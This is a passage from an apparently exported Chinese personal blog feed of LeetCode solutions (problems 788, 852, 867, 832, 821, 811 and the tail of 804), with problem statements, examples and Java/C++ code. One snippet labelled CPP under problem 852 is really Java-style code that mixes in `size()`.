<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>转换，去重</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Map&lt;Character, String&gt; map)</span> </span>&#123;</span><br><span class="line">		String[] mos = <span class="keyword">new</span> String[] &#123;<span class="string">".-"</span>,<span class="string">"-..."</span>,<span class="string">"-.-."</span>,<span class="string">"-.."</span>,<span class="string">"."</span>,<span class="string">"..-."</span>,<span class="string">"--."</span>,<span class="string">"...."</span>,<span class="string">".."</span>,<span class="string">".---"</span>,<span class="string">"-.-"</span>,<span class="string">".-.."</span>,<span class="string">"--"</span>,<span class="string">"-."</span>,<span class="string">"---"</span>,<span class="string">".--."</span>,<span class="string">"--.-"</span>,<span class="string">".-."</span>,<span class="string">"..."</span>,<span class="string">"-"</span>,<span class="string">"..-"</span>,<span class="string">"...-"</span>,<span class="string">".--"</span>,<span class="string">"-..-"</span>,<span class="string">"-.--"</span>,<span class="string">"--.."</span>&#125;;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c = <span class="string">'a'</span>; c &lt;= <span class="string">'z'</span>;c++) &#123;</span><br><span class="line">			map.put(c, mos[i++]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getWordMos</span><span class="params">(Map&lt;Character, String&gt; map, String word)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; word.length();i++) &#123;</span><br><span class="line">			sb.append(map.get(word.charAt(i)));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		init(map);</span><br><span class="line">		HashSet&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span>(String s : words) &#123;</span><br><span class="line">			set.add(getWordMos(map, s));</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>788. 旋转数字</title>
    <url>/2018/08/29/LeetCode/leetcode-000788.%20%E6%97%8B%E8%BD%AC%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="旋转数字"><a href="#旋转数字" class="headerlink" title="旋转数字"></a>旋转数字</h2><p>我们称一个数 X 为好数, 如果它的每位数字逐个地被旋转 180 度后，我们仍可以得到一个有效的，且和 X 不同的数。要求每位数字都要被旋转。</p>
<p>如果一个数的每位数字被旋转以后仍然还是一个数字， 则这个数是有效的。0, 1, 和 8 被旋转后仍然是它们自己；2 和 5 可以互相旋转成对方；6 和 9 同理，除了这些以外其他的数字旋转以后都不再是有效的数字。</p>
<p>现在我们有一个正整数 <code>N</code>, 计算从 <code>1</code> 到 <code>N</code> 中有多少个数 X 是好数？</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">10</span></span><br><span class="line">输出: <span class="number">4</span></span><br><span class="line">解释: </span><br><span class="line">在[<span class="number">1</span>, <span class="number">10</span>]中有四个好数： <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>。</span><br><span class="line">注意 <span class="number">1</span> 和 <span class="number">10</span> 不是好数, 因为他们在旋转之后不变。</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>N 的取值范围是 [1, 10000]。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>根据题目所术，如果一个数字中包含3或4或7，那么它就不是一个好数，如果它仅仅包含0或1或8也不是一个好数，那就是说，如果该数字不包含3或4或7，并且包含2或5或6或9任意中的一个的话，那么它就是一个好数。<br>N从1开始迭代，到N，将数字转换为字符串，然后判断是否满足条件即可。</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rotatedDigits</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= N; i++) &#123;</span><br><span class="line">			String num = String.valueOf(i);</span><br><span class="line">			<span class="keyword">if</span> ((num.contains(<span class="string">"2"</span>) || num.contains(<span class="string">"5"</span>) || num.contains(<span class="string">"6"</span>) || num.contains(<span class="string">"9"</span>))</span><br><span class="line">					&amp;&amp; (!num.contains(<span class="string">"3"</span>) &amp;&amp; !num.contains(<span class="string">"4"</span>) &amp;&amp; !num.contains(<span class="string">"7"</span>))) &#123;</span><br><span class="line">				sum++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>852. 山脉数组的峰顶索引</title>
    <url>/2018/08/29/LeetCode/leetcode-000852.%20%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84%E7%9A%84%E5%B3%B0%E9%A1%B6%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们把符合下列属性的数组 <code>A</code> 称作山脉：</p>
<ul>
<li><p><code>A.length &gt;= 3</code></p>
</li>
<li><p>存在 <code>0 &lt; i &lt; A.length - 1</code> 使得<code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code><br>给定一个确定为山脉的数组，返回任何满足 <code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code> 的 <code>i</code> 的值</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,2,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li><code>3 &lt;= A.length &lt;= 10000</code></li>
<li>0 &lt;= A[i] &lt;= 10^6</li>
<li>A 是如上定义的山脉<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>遍历，找到index，是的a[index - 1] &lt; a[index] 并且 a[index] &gt; a[index + 1]<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = A.length - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt;= end) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (A[index] &lt; A[index + <span class="number">1</span>]) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[index] &gt; A[index + <span class="number">1</span>]) &#123;</span><br><span class="line">        		result = index;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int peakIndexInMountainArray(int[] A) &#123;</span><br><span class="line">        int index &#x3D; 0;</span><br><span class="line">        int result &#x3D; 0;</span><br><span class="line">        int end &#x3D; A.size() - 2;</span><br><span class="line">        while (index &lt;&#x3D; end) &#123;</span><br><span class="line">        	if (A[index] &lt; A[index + 1]) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; else if (A[index] &gt; A[index + 1]) &#123;</span><br><span class="line">        		result &#x3D; index;</span><br><span class="line">        		break;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找，每次找到A[i]，确认是否A[i] &lt; A[i + 1]，不是的话，不断缩小上届和下界，找到最大的i为止。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = A.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mi = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mi] &lt; A[mi + <span class="number">1</span>]) &#123;</span><br><span class="line">                lo = mi + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hi = mi;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = A.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mi = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mi] &lt; A[mi + <span class="number">1</span>]) &#123;</span><br><span class="line">                lo = mi + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hi = mi;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>867. 转置矩阵</title>
    <url>/2018/08/29/LeetCode/leetcode-000867.%20%E8%BD%AC%E7%BD%AE%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个矩阵 <code>A</code>， 返回 <code>A</code> 的转置矩阵。</p>
<p>矩阵的转置是指将矩阵的主对角线翻转，交换矩阵的行索引与列索引。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[1,2,3],[4,5,6],[7,8,9]]</span><br><span class="line">输出：[[1,4,7],[2,5,8],[3,6,9]]</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[1,2,3],[4,5,6]]</span><br><span class="line">输出：[[1,4],[2,5],[3,6]]</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li><code>1 &lt;= A.length &lt;= 1000</code></li>
<li><code>1 &lt;= A[0].length &lt;= 1000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照矩阵转置的方法，将i,j上的数换至j,i上即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] transpose(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> R = A.length, C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] ans = <span class="keyword">new</span> <span class="keyword">int</span>[C][R];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> r = <span class="number">0</span>; r &lt; R; ++r)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; C; ++c) &#123;</span><br><span class="line">                ans[c][r] = A[r][c];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">transpose</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> R = A.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> C = A[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">result</span><span class="params">(C, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(R, <span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>; r &lt; R; ++r)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> c = <span class="number">0</span>; c &lt; C; ++c) &#123;</span><br><span class="line">                result[c][r] = A[r][c];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>832. 翻转图像</title>
    <url>/2018/08/29/LeetCode/leetcode-000832.%20%E7%BF%BB%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二进制矩阵 <code>A</code>，我们想先水平翻转图像，然后反转图像并返回结果。</p>
<p>水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 <code>[1, 1, 0]</code> 的结果是 <code>[0, 1, 1]</code>。</p>
<p>反转图片的意思是图片中的 <code>0</code> 全部被 <code>1</code> 替换， <code>1</code> 全部被 <code>0</code> 替换。例如，反转 <code>[0, 1, 1]</code> 的结果是 <code>[1, 0, 0]</code>。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0],[1,0,1],[0,0,0]]</span><br><span class="line">输出: [[1,0,0],[0,1,0],[1,1,1]]</span><br><span class="line">解释: 首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]；</span><br><span class="line">     然后反转图片: [[1,0,0],[0,1,0],[1,1,1]]</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]</span><br><span class="line">输出: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br><span class="line">解释: 首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]；</span><br><span class="line">     然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br></pre></td></tr></table></figure>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h3><ul>
<li><code>1 &lt;= A.length = A[0].length &lt;= 20</code></li>
<li><code>0 &lt;= A[i][j] &lt;= 1</code><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>先水平翻转，再翻转位数</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length;i++) &#123;</span><br><span class="line">			reverseArray(A[i]);</span><br><span class="line">			flipArray(A[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverseArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = array.length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">			<span class="keyword">int</span> temp = array[begin];</span><br><span class="line">			array[begin] = array[end];</span><br><span class="line">			array[end] = temp;</span><br><span class="line">			begin++;</span><br><span class="line">			end--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flipArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">1</span> == array[i] ) &#123;</span><br><span class="line">				array[i] = <span class="number">0</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				array[i] = <span class="number">1</span>;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>821. 字符的最短距离</title>
    <url>/2018/08/29/LeetCode/leetcode-000821.%20%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串 <code>S</code> 和一个字符 <code>C</code>。返回一个代表字符串 <code>S</code> 中每个字符到字符串 <code>S</code> 中的字符 <code>C</code> 的最短距离的数组.</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: S &#x3D; &quot;loveleetcode&quot;, C &#x3D; &#39;e&#39;</span><br><span class="line">输出: [3, 2, 1, 0, 1, 0, 0, 1, 2, 2, 1, 0]</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>字符串 <code>S</code> 的长度范围为 <code>[1, 10000]</code>。</li>
<li><code>C</code> 是一个单字符，且保证是字符串 <code>S</code> 里的字符。</li>
<li><code>S</code> 和 <code>C</code> 中的所有字母均为小写字母。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>求出所有字符C在S中的索引，然后找到最小的值即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] shortestToChar(String S, <span class="keyword">char</span> C) &#123;</span><br><span class="line">		<span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[S.length()];</span><br><span class="line">		List&lt;Integer&gt; indexs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (C == S.charAt(i)) &#123;</span><br><span class="line">        		indexs.add(i);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (C == S.charAt(i)) &#123;</span><br><span class="line">        		result[i] = <span class="number">0</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result[i] = getMin(i, indexs);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">(<span class="keyword">int</span> index, List&lt;Integer&gt; indexs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i : indexs) &#123;</span><br><span class="line">			<span class="keyword">int</span> value = Math.abs(i - index);</span><br><span class="line">			<span class="keyword">if</span> (min &gt; value) &#123;</span><br><span class="line">				min = value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> min;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>811. 子域名访问计数</title>
    <url>/2018/08/29/LeetCode/leetcode-000811.%20%E5%AD%90%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E8%AE%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一个网站域名，如”discuss.leetcode.com”，包含了多个子域名。作为顶级域名，常用的有”com”，下一级则有”leetcode.com”，最低的一级为”discuss.leetcode.com”。当我们访问域名”discuss.leetcode.com”时，也同时访问了其父域名”leetcode.com”以及顶级域名 “com”。</p>
<p>给定一个带访问次数和域名的组合，要求分别计算每个域名被访问的次数。其格式为访问次数+空格+地址，例如：”9001 discuss.leetcode.com”。</p>
<p>接下来会给出一组访问次数和域名组合的列表<code>cpdomains</code> 。要求解析出所有域名的访问次数，输出格式和输入格式相同，不限定先后顺序。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;]</span><br><span class="line">输出: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;, &quot;9001 leetcode.com&quot;, &quot;9001 com&quot;]</span><br><span class="line">说明: </span><br><span class="line">例子中仅包含一个网站域名：&quot;discuss.leetcode.com&quot;。按照前文假设，子域名&quot;leetcode.com&quot;和&quot;com&quot;都会被访问，所以它们都被访问了9001次。</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">[&quot;900 google.mail.com&quot;, &quot;50 yahoo.com&quot;, &quot;1 intel.mail.com&quot;, &quot;5 wiki.org&quot;]</span><br><span class="line">输出: </span><br><span class="line">[&quot;901 mail.com&quot;,&quot;50 yahoo.com&quot;,&quot;900 google.mail.com&quot;,&quot;5 wiki.org&quot;,&quot;5 org&quot;,&quot;1 intel.mail.com&quot;,&quot;951 com&quot;]</span><br><span class="line">说明: </span><br><span class="line">按照假设，会访问&quot;google.mail.com&quot; 900次，&quot;yahoo.com&quot; 50次，&quot;intel.mail.com&quot; 1次，&quot;wiki.org&quot; 5次。</span><br><span class="line">而对于父域名，会访问&quot;mail.com&quot; 900+1 &#x3D; 901次，&quot;com&quot; 900 + 50 + 1 &#x3D; 951次，和 &quot;org&quot; 5 次。</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li><code>cpdomains</code> 的长度小于 <code>100</code>。</li>
<li>每个域名的长度小于<code>100</code>。</li>
<li>每个域名地址包含一个或两个”.”符号。</li>
<li>输入中任意一个域名的访问次数都小于<code>10000</code>。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照. 分割域名，分别进行统计</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">subdomainVisits</span><span class="params">(String[] cpdomains)</span> </span>&#123;</span><br><span class="line">		Map&lt;String, Integer&gt; domainAndTime = <span class="keyword">new</span> HashMap&lt;&gt;(); </span><br><span class="line">        <span class="keyword">for</span> (String s : cpdomains) &#123;</span><br><span class="line">        	dealWithIt(s, domainAndTime);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(domainAndTime.size());</span><br><span class="line">        <span class="keyword">for</span> (String key : domainAndTime.keySet()) &#123;</span><br><span class="line">        	result.add(domainAndTime.get(key) + <span class="string">" "</span> + key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dealWithIt</span><span class="params">(String s, Map&lt;String, Integer&gt; domainAndTime)</span> </span>&#123;</span><br><span class="line">		String[] ss = s.split(<span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">int</span> time = Integer.valueOf(ss[<span class="number">0</span>]);</span><br><span class="line">		String domain = 